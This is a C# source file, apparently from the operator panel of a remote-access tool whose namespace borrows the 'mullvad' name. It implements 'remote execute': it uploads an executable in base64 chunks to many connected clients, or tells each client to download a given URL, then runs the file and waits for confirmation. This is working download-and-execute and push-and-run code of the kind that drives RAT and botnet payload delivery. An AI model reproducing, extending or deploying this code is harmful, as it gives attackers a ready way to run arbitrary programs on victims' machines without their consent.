using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Network;
using mullvad.Protocol;

namespace mullvad.Forms
{
    // Sends an executable to one or more clients ("From Disk" — chunked upload,
    // or "From URL" — client-side download) and runs it there.
    internal static class RemoteExecute
    {
        private const int ChunkSize = 256 * 1024;

        // "From Disk" — upload + run on every target client in parallel.
        public static async Task ExecuteFileOnClients(Form owner, List<ClientHandler> handlers,
            string filePath, string args, Action<string> status)
        {
            byte[] fileBytes;
            try   { fileBytes = File.ReadAllBytes(filePath); }
            catch (Exception ex) { status?.Invoke("Remote execute — can't read file: " + ex.Message); return; }

            string fileName = Path.GetFileName(filePath);
            string transferId = Guid.NewGuid().ToString("N")[..12];
            int totalChunks = (int)Math.Max(1, Math.Ceiling((double)fileBytes.Length / ChunkSize));

            status?.Invoke($"Remote execute (disk) — sending {fileName} ({fileBytes.Length / 1024} KB) to {handlers.Count} client(s)…");

            var tasks = handlers.Select(h => SendFileToClient(h, transferId, fileName, args, fileBytes, totalChunks, status)).ToList();
            await Task.WhenAll(tasks);
        }

        // "From URL" — every target client downloads and runs the file.
        public static async Task ExecuteUrlOnClients(Form owner, List<ClientHandler> handlers,
            string url, string args, Action<string> status)
        {
            string transferId = Guid.NewGuid().ToString("N")[..12];
            status?.Invoke($"Remote execute (URL) — sending {url} to {handlers.Count} client(s)…");

            var tasks = handlers.Select(h => SendUrlToClient(h, transferId, url, args, status)).ToList();
            await Task.WhenAll(tasks);
        }

        private static async Task SendFileToClient(ClientHandler handler, string transferId,
            string fileName, string args, byte[] fileBytes, int totalChunks, Action<string> status)
        {
            var pc = handler.Info.Computer;
            bool done = false;
            bool success = false;
            string error = "";

            Action<ClientHandler, Packet>? listener = null;
            listener = (_, pkt) =>
            {
                if (pkt.Type != PacketType.ClientExecAck) return;
                try
                {
                    var doc = System.Text.Json.JsonDocument.Parse(pkt.Json).RootElement;
                    if (!doc.TryGetProperty("transfer_id", out var tid) || tid.GetString() != transferId) return;
                    if (!doc.TryGetProperty("file_name", out var fn) || fn.GetString() != fileName) return;

                    success = doc.TryGetProperty("success", out var s) && s.GetBoolean();
                    error   = doc.TryGetProperty("error", out var e) ? e.GetString() ?? "" : "";
                    handler.PacketReceived -= listener;
                    done = true;
                }
                catch { }
            };
            handler.PacketReceived += listener;

            try
            {
                for (int i = 0; i < totalChunks; i++)
                {
                    int off  = i * ChunkSize;
                    int len  = Math.Min(ChunkSize, fileBytes.Length - off);
                    byte[] chunk = new byte[len];
                    Buffer.BlockCopy(fileBytes, off, chunk, 0, len);

                    await handler.SendAsync(Packet.Create(PacketType.ClientExecFile, new
                    {
                        transfer_id  = transferId,
                        file_name    = fileName,
                        args         = args ?? "",
                        chunk_index  = i,
                        total_chunks = totalChunks,
                        data         = Convert.ToBase64String(chunk),
                    }));
                }

                // Wait for the ack (file write + process start can take a moment)
                var deadline = DateTime.UtcNow.AddSeconds(120);
                while (!done && DateTime.UtcNow < deadline)
                    await Task.Delay(250);

                if (!done) status?.Invoke($"Remote execute — no ack from {pc} (file may still have run).");
                else       status?.Invoke(success
                            ? $"Remote execute — {fileName} started on {pc}."
                            : $"Remote execute — failed on {pc}: {error}");
            }
            catch (Exception ex)
            {
                status?.Invoke($"Remote execute — {pc}: {ex.Message}");
            }
            finally
            {
                if (!done) handler.PacketReceived -= listener;
            }
        }

        private static async Task SendUrlToClient(ClientHandler handler, string transferId,
            string url, string args, Action<string> status)
        {
            var pc = handler.Info.Computer;
            bool done = false;
            bool success = false;
            string error = "";

            Action<ClientHandler, Packet>? listener = null;
            listener = (_, pkt) =>
            {
                if (pkt.Type != PacketType.ClientExecAck) return;
                try
                {
                    var doc = System.Text.Json.JsonDocument.Parse(pkt.Json).RootElement;
                    if (!doc.TryGetProperty("transfer_id", out var tid) || tid.GetString() != transferId) return;
                    if (!doc.TryGetProperty("url", out var u) || u.GetString() != url) return;

                    success = doc.TryGetProperty("success", out var s) && s.GetBoolean();
                    error   = doc.TryGetProperty("error", out var e) ? e.GetString() ?? "" : "";
                    handler.PacketReceived -= listener;
                    done = true;
                }
                catch { }
            };
            handler.PacketReceived += listener;

            try
            {
                await handler.SendAsync(Packet.Create(PacketType.ClientExecUrl, new
                {
                    transfer_id = transferId,
                    url         = url,
                    args        = args ?? "",
                }));

                // Download can legitimately take a while — give it 10 minutes.
                var deadline = DateTime.UtcNow.AddMinutes(10);
                while (!done && DateTime.UtcNow < deadline)
                    await Task.Delay(500);

                if (!done) status?.Invoke($"Remote execute — no ack from {pc} (download may still be running).");
                else       status?.Invoke(success
                            ? $"Remote execute — {Path.GetFileName(url)} downloaded and started on {pc}."
                            : $"Remote execute — failed on {pc}: {error}");
            }
            catch (Exception ex)
            {
                status?.Invoke($"Remote execute — {pc}: {ex.Message}");
            }
            finally
            {
                if (!done) handler.PacketReceived -= listener;
            }
        }
    }
}
